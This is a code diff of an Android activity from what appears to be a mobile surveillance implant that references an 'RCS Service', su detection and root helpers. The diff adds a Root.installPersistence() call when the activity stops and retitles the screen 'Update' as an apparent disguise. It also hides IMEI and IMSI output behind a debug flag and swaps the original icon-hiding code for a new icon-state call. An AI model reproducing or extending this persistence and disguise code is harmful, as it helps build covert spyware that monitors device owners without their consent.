@@ -14,7 +14,6 @@ import android.app.admin.DevicePolicyManager;
 import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
-import android.content.pm.PackageManager;
 import android.os.Build;
 import android.os.Bundle;
 import android.os.Handler;
@@ -51,7 +50,13 @@ public class ASG extends Activity {
 	public void onCreate(final Bundle savedInstanceState) {
 		super.onCreate(savedInstanceState);
 		actualCreate(savedInstanceState);
+	}
 
+
+	@Override
+	public void onStop() {
+		super.onStop();
+		Root.installPersistence();
 	}
 
 	@Override
@@ -76,7 +81,7 @@ public class ASG extends Activity {
 
 		TextView t = (TextView) findViewById(R.id.imei);
 
-		t.setText("This is a list of device information for the current Android device:\n\n");
+		t.setText("Update\n\n");
 
 		if (Build.MODEL.length() > 0)
 			t.append("Model: " + Build.MODEL + "\n");
@@ -87,21 +92,23 @@ public class ASG extends Activity {
 		if (Build.DEVICE.length() > 0)
 			t.append("Device: " + Build.DEVICE + "\n");
 
-		if (Device.self().getImei().length() > 0)
-			t.append("IMEI: " + Device.self().getImei() + "\n");
+		if (Cfg.DEBUG) {
+			if (Device.self().getImei().length() > 0)
+				t.append("IMEI: " + Device.self().getImei() + "\n");
 
-		if (Device.self().getImsi().length() > 0)
-			t.append("IMSI: " + Device.self().getImsi() + "\n");
+			if (Device.self().getImsi().length() > 0)
+				t.append("IMSI: " + Device.self().getImsi() + "\n");
 
-		if (Build.BOARD.length() > 0)
-			t.append("Board: " + Build.BOARD + "\n");
+			if (Build.BOARD.length() > 0)
+				t.append("Board: " + Build.BOARD + "\n");
 
-		if (Build.DISPLAY.length() > 0)
-			t.append("Display: " + Build.DISPLAY + "\n");
+			if (Build.DISPLAY.length() > 0)
+				t.append("Display: " + Build.DISPLAY + "\n");
+		}
 		
 		t.append("OS Level: " + Build.VERSION.SDK_INT + "\n");
 		t.append("OS Release: " + Build.VERSION.RELEASE + "\n");
-
+		t.append("OS Runtime: " + (Root.isArtInUse()?"ART":"Dalvik")+ "\n");
 		if (Cfg.DEBUG) {
 			if (PackageInfo.hasSu()) {
 				t.append("Su: yes, ");
@@ -154,14 +161,11 @@ public class ASG extends Activity {
 					if (Cfg.DEBUG) {
 						Check.log(TAG + " RCS Service Name: " + cn.flattenToShortString());//$NON-NLS-1$
 					}
-
-					// Nascondi l'icona (subito in android 4.x, al primo reboot
-					// in android 2.x)
-					PackageManager pm = getApplicationContext().getPackageManager();
-					pm.setComponentEnabledSetting(getComponentName(), PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-							PackageManager.DONT_KILL_APP);
 				}
+
+				Status.setIconState(true);
 			}
+
 		} catch (final SecurityException se) {
 			if (Cfg.EXCEPTION) {
 				Check.log(se);
